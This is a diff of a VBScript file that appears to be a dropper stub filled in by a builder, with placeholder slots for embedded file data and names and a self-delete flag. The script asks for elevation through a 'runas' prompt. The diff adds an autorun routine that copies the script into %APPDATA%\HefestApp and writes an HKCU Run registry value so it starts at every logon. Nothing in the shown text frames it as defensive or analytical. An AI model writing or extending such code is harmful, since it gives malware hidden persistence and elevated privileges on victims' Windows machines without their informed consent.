@@ -1,16 +1,22 @@
+Dim bodyX
 bodyX="0102"
+Dim selfDel
 selfDel="__selfDel"
+Dim autorun
+autorun="__autorun"
 Dim arrFrontData
 arrFrontData = Array("__frontData")
 Dim arrFrontName
 arrFrontName = Array("__frontName")
 
 
-
 If Not IsAdmin() Then
     RunElevated()
 Else
     MainScriptLogic()
+    if autorun = "True" Then
+        DoAutoRun
+    end if
 End If
 
 Function GetFilePath(fileName)
@@ -111,4 +117,36 @@ Sub RunElevated()
     Set objShell = CreateObject("Shell.Application")
     objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
     WScript.Quit
+End Sub
+
+
+Sub DoAutoRun()
+    Dim fso, shell, scriptPath, destFolder, destPath, registryKey
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    scriptPath = WScript.ScriptFullName
+    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
+    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
+    CreateFolder fso, destFolder
+    CopyScript fso, scriptPath, destPath
+    SetAutorun shell, destPath
+    Set shell = Nothing
+    Set fso = Nothing
+End Sub
+
+Sub CreateFolder(fso, folderPath)
+    If Not fso.FolderExists(folderPath) Then
+        fso.CreateFolder(folderPath)
+    End If
+End Sub
+
+Sub CopyScript(fso, sourcePath, destinationPath)
+    fso.CopyFile sourcePath, destinationPath, True
+End Sub
+
+Sub SetAutorun(shell, scriptPath)
+    Dim registryKey, registryValue
+    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
+    registryValue = "HefestAppVbs"
+    shell.RegWrite registryKey & registryValue, """" & scriptPath & """", "REG_SZ"
 End Sub
